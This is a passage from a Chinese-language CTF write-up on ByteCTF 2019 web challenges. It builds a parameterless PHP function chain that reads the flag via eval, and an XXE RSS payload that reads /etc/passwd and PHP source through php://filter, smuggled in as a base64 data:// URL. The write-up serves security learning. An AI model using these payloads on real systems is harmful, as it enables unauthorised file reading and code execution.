&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h5 id="Bypass-One"><a href="#Bypass-One" class="headerlink" title="Bypass One"></a>Bypass One</h5><ul>
<li><p>用<code>is_valid_url()</code>来检测url格式。</p>
</li>
<li><p><code>url</code>的host必须以<code>baidu.com</code>结尾。</p>
</li>
<li><p>过滤了<code>data://</code>协议</p>
</li>
</ul>
<p>这题如果没有过滤掉data协议，可以用<code>data://text/plain;base64</code>来绕过，参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/80ce73919edb">https://www.jianshu.com/p/80ce73919edb</a></p>
<p>但是过滤掉了，那么许多师傅的解决办法就是直接买一个符合要求的域名。（好像还可以利用post.baidu.com生成跳转链接，感兴趣的可以自行搜索）</p>
<h5 id="Bypass-Two"><a href="#Bypass-Two" class="headerlink" title="Bypass Two"></a>Bypass Two</h5><p>自己搭一个第二层的本地环境来测试：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">|-- code</span><br><span class="line">||--- index.php</span><br><span class="line">|- flag.php </span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#x27;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;bye~&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>正则限制了我们只能传入函数的形式，且最后一个括号内不能带有参数，即只允许形如<code>a(b(c()))</code>的字符串。</p>
<p>关于php无参数函数可参考：<a target="_blank" rel="noopener" href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">PHP Parametric Function RCE</a></p>
<p>根据文章，我们首先可以构造一个读取当前目录中最后一个文件的payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(&#x27;.&#x27;)));</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>scandir()</code> ：列出目录中的文件和目录。</p>
</li>
<li><p><code>end()</code> ：将内部指针指向数组中的最后一个元素，并输出。</p>
</li>
<li><p><code>readfile()</code>：输出一个文件。</p>
</li>
</ul>
<p>但是问题是我们并不能在最后一个函数中使用参数<code>.</code>，所以就得找到一个函数可以不用参数就返回<code>.</code></p>
<p>存在函数<code>localeconv()</code> ，函数返回一包含本地数字及货币格式信息的数组。</p>
<p>其返回值如下：<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ByteCTF-2019-XNUCA-2019-Web/20190916152254728.png" alt="在这里插入图片描述"><br>可以看到第一个正好是我们需要的<code>.</code>，下面就需要将它取出来。</p>
<p>又存在如下限制：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#x27;</span>, <span class="variable">$code</span>)</span><br></pre></td></tr></table></figure>

<p><code>nt</code>被过滤了，所以<code>current()</code>不能使用，但是存在一个别名<code>pos()</code>，所以可以用<code>pos(localeconv())</code>来生成<code>.</code>.</p>
<p>这样使用<code>readfile(end(scandir(pos(localeconv()))));</code>就可以读取的当前目录下的最后一个文件，但是flag在上一层的目录，因此我们还需要进行目录跳转。</p>
<ul>
<li><code>chdir()</code>：函数改变当前的目录。</li>
<li><code>next()</code>：将数组中的内部指针向前移动一位，返回数组内部指针指向的下一个单元的值，即scandir返回的<code>..</code></li>
</ul>
<p>这样可以构造：<code>chdir(next(scandir(pos(localeconv()))))</code>即可以将目录改变到上层目录。</p>
<p>但是这样子有个问题，就是<code>chdir()</code>只返回bool值，但是我们需要<code>.</code>才能读文件。</p>
<p>需要找一个函数接受bool值且返回值中可以输出<code>.</code>，根据altman学长的思路orz…<br>可以利用<code>chr()</code>配合上<code>localtime()</code>返回值中的秒数，当秒数为46时，转换为字符即为<code>.</code>（其ascii码为46）。</p>
<ul>
<li><p><code>chr()</code>：根据ascii码返回指定的字符。</p>
</li>
<li><p><code>localtime()</code>：取得本地时间，返回一个关联数组包含具体的时间信息。</p>
</li>
</ul>
<p>这里还有一个问题就是<code>localtime()</code>不接收bool值的参数，但是接受<code>time()</code>作为参数，而<code>time()</code>不会受参数的影响并且会返回一个时间戳。</p>
<p>这样我们最后的payload为（针对我的本地环境，非原题环境）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</span><br></pre></td></tr></table></figure>

<p>重复发包，当秒数为46时，即可读到flag。</p>
<br>


<h1 id="rss"><a href="#rss" class="headerlink" title="rss"></a>rss</h1><p>1、进入页面后是一个订阅RSS的功能，限制了域名：</p>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ByteCTF-2019-XNUCA-2019-Web/20190909170200995.png" alt="在这里插入图片描述"></p>
<p>2、实际上RSS 是使用 XML 编写，那么就可能存在XXE漏洞。</p>
<p>参考：<a target="_blank" rel="noopener" href="https://mikeknoop.com/lxml-xxe-exploit/">https://mikeknoop.com/lxml-xxe-exploit/</a></p>
<p>上面文章中给了一个带有恶意ENTITY标记的RSS有效负载如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">title</span> [ <span class="meta">&lt;!ELEMENT <span class="keyword">title</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rss</span> <span class="attr">version</span>=<span class="string">&quot;2.0&quot;</span> <span class="attr">xmlns:atom</span>=<span class="string">&quot;http://www.w3.org/2005/Atom&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">channel</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>The Blog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span>&gt;</span>http://example.com/<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>A blog about things<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">lastBuildDate</span>&gt;</span>Mon, 03 Feb 2014 00:00:00 -0000<span class="tag">&lt;/<span class="name">lastBuildDate</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span>&gt;</span>http://example.com<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>a post<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">author</span>&gt;</span>author@example.com<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pubDate</span>&gt;</span>Mon, 03 Feb 2014 00:00:00 -0000<span class="tag">&lt;/<span class="name">pubDate</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">channel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rss</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>3、下面就是如何将这个payload传进去，这里可以利用<code>data://</code>伪协议，用<code>data://text/plain;base64,  </code> 来传入数据。</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/80ce73919edb">https://www.jianshu.com/p/80ce73919edb</a></p>
<p>因为php是不关心MIME类型的，所以我们可以构造MIME类型来绕过对域名的过滤。</p>
<p>将上述xml进行base64编码：</p>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ByteCTF-2019-XNUCA-2019-Web/20190909171158259.png" alt="在这里插入图片描述"></p>
<p>所以传入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://baidu.com/plain;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCFET0NUWVBFIHRpdGxlIFsgPCFFTEVNRU5UIHRpdGxlIEFOWSA+CjwhRU5USVRZIHh4ZSBTWVNURU0gImZpbGU6Ly8vZXRjL3Bhc3N3ZCIgPl0+Cjxyc3MgdmVyc2lvbj0iMi4wIiB4bWxuczphdG9tPSJodHRwOi8vd3d3LnczLm9yZy8yMDA1L0F0b20iPgo8Y2hhbm5lbD4KICAgIDx0aXRsZT5UaGUgQmxvZzwvdGl0bGU+CiAgICA8bGluaz5odHRwOi8vZXhhbXBsZS5jb20vPC9saW5rPgogICAgPGRlc2NyaXB0aW9uPkEgYmxvZyBhYm91dCB0aGluZ3M8L2Rlc2NyaXB0aW9uPgogICAgPGxhc3RCdWlsZERhdGU+TW9uLCAwMyBGZWIgMjAxNCAwMDowMDowMCAtMDAwMDwvbGFzdEJ1aWxkRGF0ZT4KICAgIDxpdGVtPgogICAgICAgIDx0aXRsZT4meHhlOzwvdGl0bGU+CiAgICAgICAgPGxpbms+aHR0cDovL2V4YW1wbGUuY29tPC9saW5rPgogICAgICAgIDxkZXNjcmlwdGlvbj5hIHBvc3Q8L2Rlc2NyaXB0aW9uPgogICAgICAgIDxhdXRob3I+YXV0aG9yQGV4YW1wbGUuY29tPC9hdXRob3I+CiAgICAgICAgPHB1YkRhdGU+TW9uLCAwMyBGZWIgMjAxNCAwMDowMDowMCAtMDAwMDwvcHViRGF0ZT4KICAgIDwvaXRlbT4KPC9jaGFubmVsPgo8L3Jzcz4=</span><br></pre></td></tr></table></figure>

<p>可以看到：</p>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ByteCTF-2019-XNUCA-2019-Web/20190909171403182.png" alt="在这里插入图片描述"></p>
<p>4、因为不知道路径，我们先读一下源码，用下面的ENTITY替换一下上面payload中的（因为是php文件，所以要base64一下才能读出来）：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=index.php&quot;</span> &gt;</span>]&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/ByteCTF-2019-XNUCA-2019-Web/20190909172410971.png" alt="在这里插入图片描述"></p>
<p>base解码后得到：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_startup_erros&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;routes.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$class_name</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;./classes/&#x27;</span>.<span class="variable">$class_name</span>.<span class="string">&#x27;.php&#x27;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">require_once</span> <span class="string">&#x27;./classes/&#x27;</span>.<span class="variable">$class_name</span>.<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;./controllers/&#x27;</span>.<span class="variable">$class_name</span>.<span class="string">&#x27;.php&#x27;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">require_once</span> <span class="string">&#x27;./controllers/&#x27;</span>.<span class="variable">$class_name</span>.<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没什么信息，同样的方法再读一下routes.php的源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//routes.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">set</span>(<span class="string">&#x27;index.php&#x27;</span>,function()&#123;</span><br><span class="line">    <span class="title class_">Index</span>::<span class="title function_ invoke__">createView</span>(<span class="string">&#x27;Index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">set</span>(<span class="string">&#x27;index&#x27;</span>,function()&#123;</span><br><span class="line">    <span class="title class_">Index</span>::<span class="title function_ invoke__">createView</span>(<span class="string">&#x27;Index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">set</span>(<span class="string">&#x27;fetch&#x27;</span>,function()&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;rss_url&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title class_">Fetch</span>::<span class="title function_ invoke__">handleUrl</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;rss_url&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">set</span>(<span class="string">&#x27;rss_in_order&#x27;</span>,function()&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;rss_url&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;order&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title class_">Admin</span>::<span class="title function_ invoke__">createView</span>(<span class="string">&#x27;Admin&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&#x27;127.0.0.1&#x27;</span> || <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&#x27;::1&#x27;</span>)&#123;</span><br><span class="line">        <span class="title class_">Admin</span>::<span class="title function_ invoke__">sort</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;rss_url&#x27;</span>],<span class="variable">$_REQUEST</span>[<span class="string">&#x27;order&#x27;</span>]);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;;(&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>（后来有事去了，官方环境关了，也没有合适的复现环境了）</p>
<br>

<br>


<p>参考：<br><a target="_blank" rel="noopener" href="https://altman.vip/2019/09/09/ByteCTF-WEB/">https://altman.vip/2019/09/09/ByteCTF-WEB/</a></p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>Lethe</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="https://lethe.site/blog/2019/09/11/ByteCTF-2019-XNUCA-2019-Web/">https://lethe.site/blog/2019/09/11/ByteCTF-2019-XNUCA-2019-Web/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span></span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/blog/tags/Writeup/"># Writeup</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/blog/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/blog/2019/09/19/Learn-Ajax/">学一下Ajax</a>
            
            
            <a class="next" rel="next" href="/blog/2019/09/06/SSRF-CRLF-Attack-by-SoapClient/">利用SoapClient类进行SSRF+CRLF攻击</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>Life is a struggle.</span>
        <!-- <span>© Lethe | 2019 - 2022</span> -->
    </div>
</footer>

    </div>
</body>

</html>